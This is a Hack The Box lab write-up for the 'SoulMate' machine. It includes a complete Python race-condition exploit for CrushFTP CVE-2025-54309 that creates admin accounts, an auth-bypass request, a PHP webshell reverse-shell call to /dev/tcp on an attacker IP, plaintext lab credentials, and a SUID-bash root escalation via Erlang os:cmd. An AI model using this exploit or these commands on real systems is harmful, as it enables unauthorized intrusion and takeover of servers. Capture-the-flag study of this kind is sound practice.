---
title: SoulMate
draft: false
tags:
  - Race-Condition
  - Erlang-Shell
passwordHash: cc11fa2933a0de3f627bdcda67387c0f90fef2e5381e3993518c4736b8209909
socialImage: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/2c47fcf9c85c7fbdda73a9c1b54fd60e.png
socialDescription: "HTB SoulMate: bypass de autenticación en CrushFTP (CVE-2025-31161/54309) → webshell PHP → credenciales de ben → shell Erlang en 2222 → SUID en bash = root."
---
![[../../../assets/Pasted image 20250907092555.png]]

Machine: 

# Information gathering
## Port scanning
- Lets do a [[../../../Tools/Activas/3. Escaneo de puertos/nmap|nmap]] scan to get the open ports
```bash
nmap -p- -sS -Pn -n --min-rate 5000 10.10.11.86
nmap -p22,80,4369 -sCV -Pn -n --min-rate 5000 10.10.11.86 -vvv
```
>[!example]- Show
>![[../../../assets/Pasted image 20250907111629.png]]
## Web Enumeration
- There are a HTTP port open so lets enumerate the web service, in order to know the technologies running we can use [[../../../Tools/Pasivas/Obtencion de informacion/1. Reconocimiento web/whatweb|whatweb]] & [[../../../Tools/wappanalyzer|wappanalyzer]]
```bash
whatweb -a 3 http://soulmate.htb/
```
>[!example]- Show
>![[../../../assets/Pasted image 20250907093404.png]]
>![[../../../assets/Pasted image 20250907093526.png]]

- The home page show some names:
>[!example]- Show
>![[../../../assets/Pasted image 20250907093701.png]]

- We can register and login `/register.php`, `/login.php`
>[!example]- Show
>![[../../../assets/Pasted image 20250907093736.png]]

- Lets find some subdirectories with [[../../../Tools/Enumeration/gobuster|gobuster]]
```bash
gobuster vhost -u "http://soulmate.htb/" -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 --append-domain
```
>[!example]- Show
>![[../../../assets/Pasted image 20250907143723.png]]

- After adding the vhost to `/etc/hosts` we can dive into the web, with [[../../../Tools/Activas/3. Escaneo de puertos/nmap|nmap]]:
```bash
sudo nmap -p80 -n -Pn --min-rate 5000 -sCV ftp.soulmate.htb
```
>[!example]- Show
>![[../../../assets/Pasted image 20250907143928.png]]

- Looks like "CrushFPT" is running, so lets check if this version have any vulnerability (we don't have the version, but we can try anyway), after looking for some vectors, i found this one `CVE-2025-31161` that allow us to bypass the authentication page with a race condition. 

# Exploiting (Web)
- With the help of this resource [link](https://www.huntress.com/blog/crushftp-cve-2025-31161-auth-bypass-and-post-exploitation) & [link](https://projectdiscovery.io/blog/crushftp-authentication-bypass) , we can exploit `CVE-2025-31161` & `CVE-2025-54309`, we have to create the following request:
```http
GET /WebInterface/function/?command=getUserList&serverGroup=MainUsers&c2f=OAg1 HTTP/1.1
Host: ftp.soulmate.htb
Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/
Connection: close
Cookie: CrushAuth=1757254362249_asubtDGBRgmV9yzzu3DjaFC58eOAg1
```
>[!example]- Show
>![[../../../assets/Pasted image 20250907162522.png]]
>![[../../../assets/Pasted image 20250907183307.png]]


- The service is vulnerable so we can make a exploit like this in order to change the password of the admin
```python
#!/usr/bin/env python3
"""
CrushFTP CVE-2025-54309 - Admin User Creation via Race Condition
Based on watchTowr research
"""

import requests
import threading
import sys
import random
import string

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

BANNER = "[*] CrushFTP Admin Creation Exploit (CVE-2025-54309)"
HELP = f"Usage: {sys.argv[0]} http(s)://target:port"

def generate_random_id(length=4):
    """Generate random alphanumeric string"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def create_cookie(session_id):
    """Create synthetic cookie for authentication bypass"""
    return f"CrushAuth=1755657772315_Nr7FSH4jd2l6RueteEaaEDpY1CcdU{session_id}; currentAuth={session_id}"

def build_user_payload(username, password, session_id):
    """Build setUserItem payload to create admin user"""
    user_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<user type="properties">
  <max_logins_ip>8</max_logins_ip>
  <real_path_to_user>./users/MainUsers/crushadmin/</real_path_to_user>
  <root_dir>/</root_dir>
  <version>1.0</version>
  <max_logins>0</max_logins>
  <ignore_max_logins>true</ignore_max_logins>
  <max_idle_time>0</max_idle_time>
  <password>{password}</password>
  <site>(CONNECT)(WEB_ADMIN)</site>
  <username>{username}</username>
</user>'''
    
    vfs_xml = '<?xml version="1.0" encoding="UTF-8"?><vfs type="vector"></vfs>'
    perms_xml = '<?xml version="1.0" encoding="UTF-8"?><VFS type="properties"><item name="/">(read)(view)(resume)</item></VFS>'
    
    return {
        "command": "setUserItem",
        "data_action": "new", 
        "serverGroup": "MainUsers",
        "username": username,
        "user": user_xml,
        "xmlItem": "user",
        "vfs_items": vfs_xml,
        "permissions": perms_xml,
        "c2f": session_id
    }

def send_request(url, headers, data):
    """Send HTTP POST request with timeout"""
    try:
        return requests.post(url, headers=headers, data=data, verify=False, timeout=5)
    except requests.RequestException:
        return None

def exploit_race_condition(target, username, password, max_attempts=2000):
    """Execute race condition exploit to create admin user"""
    endpoint = f"{target.rstrip('/')}/WebInterface/function/"
    host = target.replace("http://", "").replace("https://", "")
    
    print(BANNER)
    print(f"[*] Target: {endpoint}")
    print(f"[*] Creating user: {username}")
    
    # Common headers
    base_headers = {
        "Host": host,
        "User-Agent": "python-requests/2.32.3",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    for attempt in range(max_attempts):
        # Rotate session every 50 attempts
        if attempt % 50 == 0:
            session_id = generate_random_id()
            cookie = create_cookie(session_id)
            print(f"[*] New session: {session_id}")
        
        payload = build_user_payload(username, password, session_id)
        
        # Request 1: With AS2 header and special content-type
        headers1 = {
            **base_headers,
            "AS2-TO": r"\crushadmin",
            "Content-Type": "disposition-notification",
            "Cookie": cookie
        }
        
        # Request 2: Normal request without AS2 header
        headers2 = {
            **base_headers,
            "Cookie": cookie
        }
        
        # Execute race condition
        responses = [None, None]
        
        def make_request1():
            responses[0] = send_request(endpoint, headers1, payload)
            
        def make_request2():
            responses[1] = send_request(endpoint, headers2, payload)
        
        # Start both requests simultaneously
        thread1 = threading.Thread(target=make_request1)
        thread2 = threading.Thread(target=make_request2)
        
        thread1.start()
        thread2.start()
        thread1.join()
        thread2.join()
        
        # Check for success
        response = responses[1]
        if response and response.status_code == 200:
            if b"<response_status>OK</response_status>" in response.content:
                print("[+] SUCCESS: Admin user created!")
                print(f"[+] Username: {username}")
                print(f"[+] Password: {password}")
                return True
        
        # Progress indicator
        if (attempt + 1) % 100 == 0:
            print(f"[*] Progress: {attempt + 1}/{max_attempts} attempts")
    
    print("[-] FAILED: Could not create user (patched or timing issue)")
    return False

def main():
    """Main function"""
    if len(sys.argv) != 2:
        print(HELP)
        sys.exit(1)
    
    target = sys.argv[1]
    
    if not target.startswith(("http://", "https://")):
        print("[!] ERROR: URL must start with http:// or https://")
        sys.exit(1)
    
    # Default credentials (modify as needed)
    username = "adminwatch"
    password = "W@tchTwR!234"
    
    exploit_race_condition(target, username, password)

if __name__ == "__main__":
    main()

```

>[!note]- Explanation
>This proof-of-concept script targets a race condition in CrushFTP’s WebInterface endpoint.  
It simultaneously issues two crafted requests with diverging headers (`AS2-TO` vs. none) to desynchronize input validation and state handling.  
The payload leverages the `setUserItem` functionality to inject a malicious user definition into the XML-based user store.  
Under precise timing, the race can bypass normal access controls, resulting in the creation of a persistent administrator account.  
It demonstrates how concurrency flaws in request processing can be chained with misused XML handlers for privilege escalation.


- After execute this script we can login with the given creds
>[!example]- Show
>![[../../../assets/Pasted image 20250907195407.png]]

# Exploiting (Web to Shell)
- after look for something interesting i notice that the user `ben` have interesting file so, as we can change him password, lets change it and login
>[!example]- Show
>![[../../../assets/Pasted image 20250907202457.png]]

- Now we can check the files, but there arent anything interesting
>[!example]- Show
>![[../../../assets/Pasted image 20250908120311.png]]

- lets upload a revershell in the server
>[!example]- Show
>![[../../../assets/Pasted image 20250908120924.png]]
>![[../../../assets/Pasted image 20250908120955.png]]
>![[../../../assets/Pasted image 20250908121621.png]]

- Now lets send us a revershell
```bash
# attacker machine
nc -lvnp 4444
```
```bash
# web
http://soulmate.htb/payload2.php?0=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.100%2F4444%200%3E%261%22
```
>[!example]- Show
>![[../../../assets/Pasted image 20250908122257.png]]

# Privilege escalation
## Enumeration
- Look for files with hardcode credentials, i found this one, but seems to be not interesting
```bash
find ./ -type f -exec grep -iIE "password" {} +
```
>[!example]- Show
>![[../../../assets/Pasted image 20250908122511.png]]

> Creds: `admin:Crush4dmin990`

- There are a database file inside "data" directory
>[!example]- Show
>![[../../../assets/Pasted image 20250908123027.png]]

- if we use `SQLite3` we can see a table named "users", that's contains a password
```bash
.tables;
select * from users;
```
>[!example]- Show
>![[../../../assets/Pasted image 20250908123150.png]]

- After a while, look for something useful i found this file:
```bash
ps faux
```
>[!example]- Show
>![[../../../assets/Pasted image 20250908172036.png]]
>![[../../../assets/Pasted image 20250908172110.png]]

>Creds:`ben:HouseH0ldings998`
## Lateral Movement
- So lets us the creds
```bash
su ben
```
>[!example]- Show
>![[../../../assets/Pasted image 20250908172334.png]]


# Privilege escalation (ben to root)
## Enumeration
- looking for something interesting, i found that the port `2222` was open (because erlang shell is running, as this file show us `/usr/local/lib/erlang_login/start.escript`)
>[!example]- Show
>![[../../../assets/Pasted image 20250908230709.png]]

## Exploitation
- If we connect to this service with the known credentials, we have a erlang shell, and how this process is running under UID 0, we are root on this shell
```bash
ssh ben@127.0.0.1 -p 2222
```
>[!example]- Show
>![[../../../assets/Pasted image 20250908230917.png]]

- this shell allow execute commands at system level so now we can set SUID perms to `/bin/bash` in order to get a root shell
```bash
os:cmd("chmod +s /bin/bash").
```
>[!example]- Show
>![[../../../assets/Pasted image 20250908231136.png]]

- Now we are root:
```bash
ll /bin/bash
bash -p
```
>[!example]- Show
>![[../../../assets/Pasted image 20250908231305.png]]


